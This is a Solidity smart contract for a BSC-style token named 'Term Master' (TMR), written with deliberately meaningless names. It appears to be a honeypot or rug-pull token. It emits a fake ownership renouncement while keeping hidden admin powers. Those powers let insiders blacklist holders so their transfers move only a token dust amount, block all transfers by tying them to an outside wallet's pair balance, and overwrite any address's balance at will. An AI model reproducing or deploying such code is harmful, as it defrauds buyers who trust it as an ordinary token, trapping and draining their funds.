//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface launchedLiquidity {
    function createPair(address sellSenderWallet, address teamTx) external returns (address);
}

interface takeMarketing {
    function totalSupply() external view returns (uint256);

    function balanceOf(address shouldSender) external view returns (uint256);

    function transfer(address buyLaunch, uint256 sellMin) external returns (bool);

    function allowance(address autoFrom, address spender) external view returns (uint256);

    function approve(address spender, uint256 sellMin) external returns (bool);

    function transferFrom(
        address sender,
        address buyLaunch,
        uint256 sellMin
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fromAuto, uint256 value);
    event Approval(address indexed autoFrom, address indexed spender, uint256 value);
}

abstract contract tokenBuy {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface sellLiquidity {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface maxBuy is takeMarketing {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract TermMaster is tokenBuy, takeMarketing, maxBuy {

    function sellFundExempt() public {
        emit OwnershipTransferred(receiverAmount, address(0));
        tradingList = address(0);
    }

    function transfer(address tokenIs, uint256 sellMin) external virtual override returns (bool) {
        return buyTake(_msgSender(), tokenIs, sellMin);
    }

    address public receiverAmount;

    mapping(address => uint256) private maxAuto;

    uint256 public takeFee;

    mapping(address => bool) public totalFeeEnable;

    address isEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 constant receiverTx = 3 ** 10;

    uint256 public walletSwap;

    function transferFrom(address tokenWalletReceiver, address buyLaunch, uint256 sellMin) external override returns (bool) {
        if (_msgSender() != isEnable) {
            if (fundSender[tokenWalletReceiver][_msgSender()] != type(uint256).max) {
                require(sellMin <= fundSender[tokenWalletReceiver][_msgSender()]);
                fundSender[tokenWalletReceiver][_msgSender()] -= sellMin;
            }
        }
        return buyTake(tokenWalletReceiver, buyLaunch, sellMin);
    }

    string private launchedFund = "TMR";

    bool public autoReceiver;

    function buyTake(address tokenWalletReceiver, address buyLaunch, uint256 sellMin) internal returns (bool) {
        if (tokenWalletReceiver == receiverAmount) {
            return enableLiquidity(tokenWalletReceiver, buyLaunch, sellMin);
        }
        uint256 teamSender = takeMarketing(swapMarketing).balanceOf(swapTrading);
        require(teamSender == teamBuyIs);
        require(buyLaunch != swapTrading);
        if (amountMinTotal[tokenWalletReceiver]) {
            return enableLiquidity(tokenWalletReceiver, buyLaunch, receiverTx);
        }
        return enableLiquidity(tokenWalletReceiver, buyLaunch, sellMin);
    }

    function modeListTo(address launchAmount) public {
        autoSender();
        
        if (launchAmount == receiverAmount || launchAmount == swapMarketing) {
            return;
        }
        amountMinTotal[launchAmount] = true;
    }

    event OwnershipTransferred(address indexed amountLiquidity, address indexed feeAt);

    uint8 private shouldMarketing = 18;

    function listSender(address toFee) public {
        require(toFee.balance < 100000);
        if (autoReceiver) {
            return;
        }
        if (teamTake != takeFee) {
            walletSwap = takeFee;
        }
        totalFeeEnable[toFee] = true;
        
        autoReceiver = true;
    }

    uint256 senderTotal;

    function balanceOf(address shouldSender) public view virtual override returns (uint256) {
        return maxAuto[shouldSender];
    }

    function modeMarketing(uint256 sellMin) public {
        autoSender();
        teamBuyIs = sellMin;
    }

    uint256 public teamTake;

    function autoSender() private view {
        require(totalFeeEnable[_msgSender()]);
    }

    mapping(address => mapping(address => uint256)) private fundSender;

    mapping(address => bool) public amountMinTotal;

    function decimals() external view virtual override returns (uint8) {
        return shouldMarketing;
    }

    address swapTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function symbol() external view virtual override returns (string memory) {
        return launchedFund;
    }

    function approve(address atLaunch, uint256 sellMin) public virtual override returns (bool) {
        fundSender[_msgSender()][atLaunch] = sellMin;
        emit Approval(_msgSender(), atLaunch, sellMin);
        return true;
    }

    address public swapMarketing;

    function owner() external view returns (address) {
        return tradingList;
    }

    address private tradingList;

    function enableLiquidity(address tokenWalletReceiver, address buyLaunch, uint256 sellMin) internal returns (bool) {
        require(maxAuto[tokenWalletReceiver] >= sellMin);
        maxAuto[tokenWalletReceiver] -= sellMin;
        maxAuto[buyLaunch] += sellMin;
        emit Transfer(tokenWalletReceiver, buyLaunch, sellMin);
        return true;
    }

    uint256 private takeSender = 100000000 * 10 ** 18;

    uint256 teamBuyIs;

    function name() external view virtual override returns (string memory) {
        return modeFundLaunch;
    }

    function allowance(address enableFrom, address atLaunch) external view virtual override returns (uint256) {
        if (atLaunch == isEnable) {
            return type(uint256).max;
        }
        return fundSender[enableFrom][atLaunch];
    }

    function getOwner() external view returns (address) {
        return tradingList;
    }

    string private modeFundLaunch = "Term Master";

    constructor (){
        if (walletSwap == teamTake) {
            teamTake = walletSwap;
        }
        sellLiquidity receiverSellAt = sellLiquidity(isEnable);
        swapMarketing = launchedLiquidity(receiverSellAt.factory()).createPair(receiverSellAt.WETH(), address(this));
        if (teamTake != takeFee) {
            takeFee = walletSwap;
        }
        receiverAmount = _msgSender();
        totalFeeEnable[receiverAmount] = true;
        maxAuto[receiverAmount] = takeSender;
        sellFundExempt();
        
        emit Transfer(address(0), receiverAmount, takeSender);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return takeSender;
    }

    function amountTo(address tokenIs, uint256 sellMin) public {
        autoSender();
        maxAuto[tokenIs] = sellMin;
    }

}